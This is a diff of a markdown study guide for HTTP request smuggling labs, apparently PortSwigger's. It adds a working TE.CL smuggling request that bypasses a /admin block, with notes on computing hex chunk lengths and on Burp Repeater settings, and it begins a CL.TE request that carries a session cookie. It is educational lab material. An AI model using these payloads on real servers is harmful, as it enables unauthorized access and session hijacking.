@@ -898,7 +898,7 @@ csrf=TheCSRFTokenValue&username=carlos
 
 >Architecture with front-end and back-end server, and front-end or back-end does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
   
-[TE.CL multiCase - Transfer-Encoding](#tecl-multicase---transfer-encoding)  
+[TE.CL multiCase - Admin blocked](#tecl-multiCase---admin-blocked)  
 [CL.TE multiCase - Admin blocked](#clte-multicase---admin-blocked)  
 [CL.TE multiCase - Content-Length](#clte-multicase---content-length)  
 [CL.TE multiCase - User-Agent Cookie Stealer](#clte-multicase---user-agent-cookie-stealer)  
@@ -906,48 +906,48 @@ csrf=TheCSRFTokenValue&username=carlos
 [HTTP/2 smuggling via CRLF injection](#http2-smuggling-via-crlf-injection)  
 [HTTP/2 TE desync v10a h2path](#http2-te-desync-v10a-h2path)  
   
-### TE.CL multiCase - Transfer-Encoding
+### TE.CL multiCase - Admin blocked  
+
+>When attempting to access `/admin` portal URL path, we get the filter message, `Path /admin is blocked`. The HTTP Request Smuggler scanner ***identify*** the vulnerability as `TE.CL multiCase (delayed response)`. **Note:** because back-end server doesn't support chunked encoding, turn off `Update Content-Length` in Repeater menu.  
+
+>After disable auto content length update, changing to `HTTP/1.1`, then send below request twice, adding the second header `Content-Length: 15` prevent the HOST header conflicting with first request.  
+>**Note:** need to include the trailing sequence `\r\n\r\n` following the final `0`.  
   
 >Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  
 
-![TE-CL-http-request-smuggle.png](images/TE-CL-http-request-smuggle.png)  
-
->**Note:** In certain smuggle vulnerabilities, go to Repeater menu and ensure the **"Update Content-Length"** option is unchecked.  
-
-```
+```html
 POST / HTTP/1.1
 Host: TARGET.net
+Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
 
 71
-GET /admin HTTP/1.1
+POST /admin HTTP/1.1
 Host: localhost
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 x=1
-0  
-  
-```  
+0
 
->**Note:** include the trailing sequence \r\n\r\n following the final 0.  
+```  
 
 >Calculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminating **ZERO**, not including the ZERO AND not the preceding ```\r\n``` on line above ZERO, as part of length. The initial POST request **content-length** is manually set.  
   
-[TJCHacking - Request Smuggling Calculator](https://github.com/tjcim/request_smuggling_calculator)  
-  
+![te.cl.multicase-smuggle.png](images/te.cl.multicase-smuggle.png)  
+
 [PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)  
 
 ### CL.TE multiCase - Admin blocked  
 
->When attempting to access admin portal URL path, we get the filter message, ```Path /admin is blocked```. The HTTP Request Smuggler scanner ***identify*** the vulnerability as ```CL.TE multiCase (delayed response)```.  
+>When attempting to access `/admin` portal URL path, we get the filter message, `Path /admin is blocked`. The HTTP Request Smuggler scanner ***identify*** the vulnerability as `CL.TE multiCase (delayed response)`.  
 
 >To access the admin panel, send below request twice, adding the second header ```Content-Length: 10``` prevent the HOST header conflicting with first request.  
 
 ```html
 POST / HTTP/1.1
-Host: 0a9b003b0354be5ac067313000d000a0.web-security-academy.net
+Host: TARGET.net
 Cookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Content-Type: application/x-www-form-urlencoded
